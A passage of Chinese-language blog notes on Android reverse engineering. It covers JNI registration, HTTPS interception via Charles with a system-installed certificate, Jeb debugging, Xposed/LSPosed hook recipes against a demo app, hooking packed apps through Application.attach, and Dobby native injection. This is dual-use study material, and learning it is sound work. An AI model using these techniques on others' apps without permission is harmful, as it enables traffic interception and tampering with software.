</li>
<li>NDK<ul>
<li>Android 的开发包，用于开发 C &#x2F; C++的动态库，编译成 &#x2F;so文件供 Java 调用，支持打包成 apk。NDK（Native Development Kit）是一套用于开发Android应用程序的工具集，它允许您在C&#x2F;C++中编写性能关键的部分代码，并将这些代码与Java代码进行连接。</li>
</ul>
</li>
<li>实战<ul>
<li>创建 Native 包</li>
<li>下载 NDK，CMake</li>
</ul>
</li>
</ul>
<p>参考资料：安卓逆向这档事</p>
<p><a href="https://www.52pojie.cn/thread-1787667-1-1.html">https://www.52pojie.cn/thread-1787667-1-1.html</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MainActivity.java</span></span><br><span class="line"><span class="comment">// 启动这个 java 代码，主要逻辑在 cpp 里，cpp代码也可以重新修改 java </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Log.d(<span class="string">&quot;topday&quot;</span>,setMySonName(<span class="string">&quot;topday&quot;</span>));</span><br><span class="line">        sayHello(<span class="string">&quot;topday&quot;</span>);</span><br><span class="line">        Log.d(<span class="string">&quot;topday&quot;</span>,<span class="string">&quot;加法&quot;</span>+add(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">native</span> String <span class="title function_">setMySonName</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">(String speak)</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="comment">// 此处静态注册方法，长的方法名</span></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_example_lesson16_MainActivity_setMySonName</span><span class="params">(JNIEnv *env, jobject thiz, jstring name)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement setMySonName()</span></span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;我是来自Java层的 -&gt;%s&quot;</span>,env-&gt;<span class="built_in">GetStringUTFChars</span>(name, JNI_FALSE));</span><br><span class="line">    std::string ss= <span class="string">&quot;topdayforjni&quot;</span>;</span><br><span class="line">    jstring  jstring1 = env-&gt;<span class="built_in">NewStringUTF</span>(ss.<span class="built_in">c_str</span>());</span><br><span class="line">    <span class="keyword">return</span> jstring1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后续为动态注册</span></span><br><span class="line"><span class="comment">//public  native void sayHello(String speak);</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sayHelloToJNI</span><span class="params">(JNIEnv *env, jobject thiz,jstring speak)</span></span>&#123;</span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;我是来自Java层说话的的函数 -&gt;%s&quot;</span>,env-&gt;<span class="built_in">GetStringUTFChars</span>(speak, JNI_FALSE));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//public  native int sayNum(int i);</span></span><br><span class="line"><span class="function">jint <span class="title">addToJNI</span><span class="params">(JNIEnv *env, jobject thiz,jint a,jint b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> JNINativeMethod nativeMethod[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;sayHello&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,(<span class="type">void</span>*)sayHelloToJNI&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;add&quot;</span>,<span class="string">&quot;(II)I&quot;</span>,(<span class="type">void</span>*)addToJNI&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm,<span class="type">void</span> * reserved)</span></span>&#123;</span><br><span class="line">    <span class="comment">//初始化环境，每一个JNIEnv对应一个线程环境，且JNIEnv不能跨线程使用，如果想要在其他线程中使用JNIEnv则需要给当前线程附加JNIEnv环境</span></span><br><span class="line">    <span class="comment">//vm-&gt;AttachCurrentThread(&amp;env,0);//给当前线程附加JNIEnv环境</span></span><br><span class="line">    <span class="comment">//vm-&gt;DetachCurrentThread();//分离当前线程环境</span></span><br><span class="line">    JNIEnv *env = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//给JNIEnv环境赋值</span></span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span>**)&amp;env,JNI_VERSION_1_4)!=JNI_OK)&#123;<span class="comment">//从JavaVM(java虚拟机)中获取线程的JNIEnv环境</span></span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取class对象，classPathName为java类的完整包名+类名</span></span><br><span class="line">    jclass clazz = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/test/MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(clazz == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> result = env-&gt;<span class="built_in">RegisterNatives</span>(clazz,nativeMethod,<span class="built_in">sizeof</span>(nativeMethod) / <span class="built_in">sizeof</span> (nativeMethod[<span class="number">0</span>]));</span><br><span class="line">    <span class="comment">//注册Java方法和c++方法的映射关系</span></span><br><span class="line">    <span class="keyword">if</span>(result&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">LOGE</span>(<span class="string">&quot;方法映射失败&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="逆向环境-amp-安卓基础"><a href="#逆向环境-amp-安卓基础" class="headerlink" title="逆向环境 &amp; 安卓基础"></a>逆向环境 &amp; 安卓基础</h1><p>真机还没到，先用模拟器+面具+lsp</p>
<ul>
<li>抓包 Charles<ul>
<li>导入证书，手动导入 &#x2F; chls.pro&#x2F;ssl</li>
<li>证书移动到系统目录，安装 Move_Certificates 模块，自动把证书移动到系统目录（雷电的 ROOT 怎么不稳定）</li>
</ul>
</li>
<li>数据加密原理<ul>
<li>浅析APP代理检测对抗 <a href="https://xz.aliyun.com/t/11398#toc-6">https://xz.aliyun.com/t/11398#toc-6</a></li>
</ul>
</li>
<li>安装 Postern<ul>
<li>HTTPS&#x3D; HTTP + SSL ，此处加密在 <strong>OSI 7层模型</strong> 的表示层</li>
<li>VPN 协议大多是作用在 OSI 的第二层和第三层之间。能抓到更多的流量</li>
<li>利用 Postern 转发本地 SOCKS5 流量到 Charles</li>
<li>手机请求 -&gt; Postern(手机代理) -&gt;charles -&gt; 主机代理(charles 本地) -&gt; 服务器</li>
</ul>
</li>
</ul>
<p>dex 文件就是字节码</p>
<ul>
<li>编译后的安卓程序代码文件</li>
<li>dex 反汇编后是 Smail 代码</li>
</ul>
<p>反汇编工具</p>
<ul>
<li>Jeb，带自动跳转，.&#x2F;jeb&#x2F;jeb_linux.sh</li>
</ul>
<p>基础语法</p>
<ul>
<li><a href="https://blog.csdn.net/qq_41155858/article/details/127539649">https://blog.csdn.net/qq_41155858/article/details/127539649</a></li>
</ul>
<p>调试（Jeb 工具）</p>
<ul>
<li>setprop ro.debuggable 1</li>
<li>Jeb 工具，CTRL + B 下断点，Tab 跳转到反编译源码（Smail -&gt; Java）</li>
<li>点击 start 附加在运行的程序上</li>
<li>模拟器自带的 Dex 编辑器++能够直接重新打包</li>
</ul>
<h1 id="LSPosed"><a href="#LSPosed" class="headerlink" title="LSPosed"></a>LSPosed</h1><p>xposed -&gt; edxposed -&gt; lsposed</p>
<p>编写插件&#x2F;组件、便于 Hook 的框架</p>
<p>1、正常创建项目，导入 api-82 包</p>
<p>2、修改 compileOnly files(‘libs&#x2F;api-82.jar’)  &#x2F;&#x2F;只在编译时有效，不会参与打包</p>
<p>3、AndroidManifest.xml 新增模块</p>
<p>4、新建 assets 文件夹，指定 xposed_init 初始化模块</p>
<p>5、编写代码</p>
<p>参考：<a href="https://www.52pojie.cn/thread-1740944-1-1.html">https://www.52pojie.cn/thread-1740944-1-1.html</a></p>
<p>原理：<a href="https://www.52pojie.cn/thread-1694093-1-1.html">https://www.52pojie.cn/thread-1694093-1-1.html</a></p>
<p>某手利用代理的方式还是抓不到评论</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">1、正常类直接看案例</span><br><span class="line">2、jadx 可直接右键复制 xposed 代码，修改 classLoader，指定外部类</span><br><span class="line">3、匿名类，查看 Smail 语法，仿写 com.example.Hookdemo.Person$1</span><br></pre></td></tr></table></figure>

<img src="/2024/07/31/Notes-Android/01.png" class title="This is an example image">

<p>常用语法整理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.example.hookdemo&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Hook-类的构造方法"><a href="#Hook-类的构造方法" class="headerlink" title="Hook 类的构造方法"></a>Hook 类的构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 包名.类名，参数类型，构造方法的上层类就是 Person</span></span><br><span class="line">XposedHelpers.findAndHookConstructor(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>, loadPackageParam.classLoader, String.class, <span class="type">int</span>.class, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="Hook-类的普通方法"><a href="#Hook-类的普通方法" class="headerlink" title="Hook 类的普通方法"></a>Hook 类的普通方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> loadPackageParam.classLoader;</span><br><span class="line">Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;getName&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="Hook-类的内部类的构造方法"><a href="#Hook-类的内部类的构造方法" class="headerlink" title="Hook 类的内部类的构造方法"></a>Hook 类的内部类的构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> loadPackageParam.classLoader;</span><br><span class="line">Class&lt;?&gt; Person_clazz = classLoader.loadClass(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>);</span><br><span class="line"><span class="comment">// jadx 可直接右键复制 xposed 代码，修改 classLoader，指定上层类</span></span><br><span class="line">XposedHelpers.findAndHookConstructor(<span class="string">&quot;com.example.hookdemo.Person$People&quot;</span>, Person_clazz.getClassLoader(), Person_clazz,String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">        <span class="comment">// argument 1 has type com.example.hookdemo.Person</span></span><br><span class="line">        param.args[<span class="number">1</span>] = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="Hook-类的内部匿名类"><a href="#Hook-类的内部匿名类" class="headerlink" title="Hook 类的内部匿名类"></a>Hook 类的内部匿名类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 此处用 jadx 查看 Smail 语法，仿写，复制的不太准</span></span><br><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.example.hookdemo.Person$1&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;eatFunc&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="Hook-类的普通成员变量"><a href="#Hook-类的普通成员变量" class="headerlink" title="Hook 类的普通成员变量"></a>Hook 类的普通成员变量</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// private String name;</span></span><br><span class="line"><span class="comment">// 普通变量不能修改，只能获取初始值</span></span><br><span class="line"><span class="comment">// 获取普通属性就要实例化，staic属性不需要实例化</span></span><br><span class="line"><span class="comment">// 此处其实是 hook print 方法，内部逻辑获取成员变量</span></span><br><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;print&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到对象的两种方法</span></span><br><span class="line">        <span class="comment">//1.param.thisObject;</span></span><br><span class="line">        <span class="comment">//2.</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> loadPackageParam.classLoader;</span><br><span class="line">        Class&lt;?&gt; Person_clazz = classLoader.loadClass(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 相当于 Person person = new Proson()</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj_person</span> <span class="operator">=</span> XposedHelpers.newInstance(Person_clazz);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取普通类的 非静态变量</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) XposedHelpers.getObjectField(obj_person, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改静态成员才有效</span></span><br><span class="line">        <span class="comment">//XposedHelpers.setObjectField(obj_person,&quot;name&quot;,&quot;xxx&quot;);</span></span><br></pre></td></tr></table></figure>

<h2 id="Hook-类的静态成员变量-java反射"><a href="#Hook-类的静态成员变量-java反射" class="headerlink" title="Hook 类的静态成员变量(java反射)"></a>Hook 类的静态成员变量(java反射)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取并修改普通类的 private static int age</span></span><br><span class="line"><span class="type">int</span> <span class="variable">xp_age</span> <span class="operator">=</span> XposedHelpers.getStaticIntField(Person_clazz, <span class="string">&quot;age&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;topday&quot;</span>,<span class="string">&quot;获取普通类的 private_age -&gt;&quot;</span>+xp_age);</span><br><span class="line">XposedHelpers.setStaticIntField(param.thisObject.getClass(),<span class="string">&quot;age&quot;</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取并修改普通类的   public static String address</span></span><br><span class="line"><span class="type">String</span> <span class="variable">xp_address</span> <span class="operator">=</span> (String) XposedHelpers.getStaticObjectField(param.thisObject.getClass(), <span class="string">&quot;address&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;topday&quot;</span>,<span class="string">&quot;获取普通类的 public static String -&gt;&quot;</span>+xp_address);</span><br><span class="line">XposedHelpers.setStaticObjectField(param.thisObject.getClass(),<span class="string">&quot;address&quot;</span>,<span class="string">&quot;M78星云&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//反射</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">age_id</span> <span class="operator">=</span> param.thisObject.getClass().getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">age_id.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age_int</span> <span class="operator">=</span> (<span class="type">int</span>)age_id.get(<span class="literal">null</span>);</span><br><span class="line">Log.d(<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;获取普通类的 private_age -&gt;&quot;</span>+age_int);</span><br><span class="line">age_id.set(<span class="literal">null</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Hook-类的类参数的普通成员变量"><a href="#Hook-类的类参数的普通成员变量" class="headerlink" title="Hook 类的类参数的普通成员变量"></a>Hook 类的类参数的普通成员变量</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例化 Person 类的时候，类成员和匿名类同时也调用对应的构造函数</span></span><br><span class="line"><span class="comment">// 获取内部类的普通属性</span></span><br><span class="line"><span class="comment">// 获取普通属性就要实例化，staic属性不需要实例化</span></span><br><span class="line">Class&lt;?&gt; PeopleClass = Person_clazz.getClassLoader().loadClass(<span class="string">&quot;com.example.hookdemo.Person$People&quot;</span>);</span><br><span class="line"><span class="comment">// 相当于 Person.People people2 = new Person.People();</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">peoPleobject</span> <span class="operator">=</span> XposedHelpers.newInstance(PeopleClass, obj_person);</span><br><span class="line"><span class="type">String</span> <span class="variable">name1</span> <span class="operator">=</span> (String) XposedHelpers.getObjectField(peoPleobject, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;获取内部类的普通属性 name -&gt;&quot;</span>+name1);</span><br></pre></td></tr></table></figure>

<h2 id="Hook-类的匿名类的普通成员变量"><a href="#Hook-类的匿名类的普通成员变量" class="headerlink" title="Hook 类的匿名类的普通成员变量"></a>Hook 类的匿名类的普通成员变量</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取匿名类的普通属性</span></span><br><span class="line"><span class="comment">// 获取普通属性就要实例化，staic属性不需要实例化</span></span><br><span class="line">Class&lt;?&gt; niminmgclass = XposedHelpers.findClass(<span class="string">&quot;com.example.hookdemo.Person$1&quot;</span>, Person_clazz.getClassLoader());</span><br><span class="line"><span class="comment">// 相当于 this.person1.nimingfangfa1();</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">nimingduixiang</span> <span class="operator">=</span> XposedHelpers.newInstance(niminmgclass, obj_person);</span><br><span class="line"><span class="type">int</span> <span class="variable">ceshi</span> <span class="operator">=</span> XposedHelpers.getIntField(nimingduixiang, <span class="string">&quot;ceshi&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;获取匿名类的普通属性 ceshi -&gt;&quot;</span>+ceshi);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取并修改匿名类的静态属性</span></span><br><span class="line"><span class="type">int</span> <span class="variable">xp_anonymoutInt</span> <span class="operator">=</span> XposedHelpers.getStaticIntField(niminmgclass, <span class="string">&quot;anonymoutInt&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;获取匿名类的静态属性 xp_anonymoutInt -&gt;&quot;</span>+xp_anonymoutInt);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改静态成员才有效</span></span><br><span class="line">XposedHelpers.setStaticIntField(niminmgclass,<span class="string">&quot;anonymoutInt&quot;</span>,<span class="number">666</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Hook-内主动调用方法"><a href="#Hook-内主动调用方法" class="headerlink" title="Hook 内主动调用方法"></a>Hook 内主动调用方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>, loadPackageParam.classLoader, <span class="string">&quot;print&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; Person_clazz = XposedHelpers.findClass(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">//非静态</span></span><br><span class="line">        XposedHelpers.callMethod(XposedHelpers.newInstance(Person_clazz),<span class="string">&quot;print&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="number">100</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="comment">//静态的</span></span><br><span class="line">        XposedHelpers.callStaticMethod(Person_clazz,<span class="string">&quot;print&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="number">99</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//内部类</span></span><br><span class="line">        Class&lt;?&gt; PeopleClass = Person_clazz.getClassLoader().loadClass(<span class="string">&quot;com.example.hookdemo.Person$People&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">peoPleobject</span> <span class="operator">=</span> XposedHelpers.newInstance(PeopleClass, XposedHelpers.newInstance(Person_clazz));</span><br><span class="line">        <span class="comment">//非静态</span></span><br><span class="line">        XposedHelpers.callMethod(peoPleobject,<span class="string">&quot;print&quot;</span>,<span class="string">&quot;1内部&quot;</span>,<span class="number">100</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="hookAllMethods-amp-hookMethod"><a href="#hookAllMethods-amp-hookMethod" class="headerlink" title="hookAllMethods &amp; hookMethod"></a>hookAllMethods &amp; hookMethod</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hookAllMethods <span class="comment">// Hook所有同类方法（重载）</span></span><br><span class="line">hookMethod <span class="comment">// 替换</span></span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; Person_clazz = XposedHelpers.findClass(<span class="string">&quot;com.example.hookdemo.Person&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line"><span class="type">Method</span> <span class="variable">print_id</span> <span class="operator">=</span> Person_clazz.getDeclaredMethod(<span class="string">&quot;print&quot;</span>, String.class, <span class="type">int</span>.class);</span><br><span class="line"></span><br><span class="line">XposedBridge.hookMethod(print_id, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;topday&quot;</span>,<span class="string">&quot;两个参数 此函数已经被我替换了&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="加壳-x2F-多dex导致找不到类"><a href="#加壳-x2F-多dex导致找不到类" class="headerlink" title="加壳 &#x2F; 多dex导致找不到类"></a>加壳 &#x2F; 多dex导致找不到类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试加固：</span><br><span class="line">1、app 签名</span><br><span class="line">2、上传到 360 加固</span><br><span class="line">3、MT 管理器实现签名</span><br><span class="line"></span><br><span class="line">hook attach</span><br><span class="line">attach:https://blog.csdn.net/caoshen2014/article/details/103341690</span><br></pre></td></tr></table></figure>

<img src="/2024/07/31/Notes-Android/02.png" class title="This is an example image">

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(Application.class, <span class="string">&quot;attach&quot;</span>, Context.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        ClassLoader cl= ((Context)param.args[<span class="number">0</span>]).getClassLoader();</span><br><span class="line">        Class&lt;?&gt; hookclass=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hookclass=cl.loadClass(<span class="string">&quot;com.example.hookdemo.Person$People&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;未找到类&quot;</span>,e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        XposedHelpers.findAndHookMethod(hookclass, <span class="string">&quot;print&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                Log.d(<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;hook打印&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>Tips：Xposed hook 在 java 层，SO 在 native 层，关键性能代码常在 native 层</p>
<h2 id="Hook-native（Dobby-）"><a href="#Hook-native（Dobby-）" class="headerlink" title="Hook native（Dobby ）"></a>Hook native（Dobby ）</h2><p>参考：<a href="https://blog.csdn.net/weixin_56039202/article/details/128591978">https://blog.csdn.net/weixin_56039202/article/details/128591978</a></p>
<ul>
<li>xposed  写一个 so  注入器   </li>
<li>新建 native 项目，编写 Dobby 代码，编译出自己的 so 文件（提取 apk 的 so 文件，指定绝对地址）</li>
<li>把 so 放到指定目录</li>
<li>运行注入器</li>
</ul>
<h2 id="类内有特殊参数"><a href="#类内有特殊参数" class="headerlink" title="类内有特殊参数"></a>类内有特殊参数</h2><p><a href="https://bbs.kanxue.com/thread-215039.htm">https://bbs.kanxue.com/thread-215039.htm</a></p>
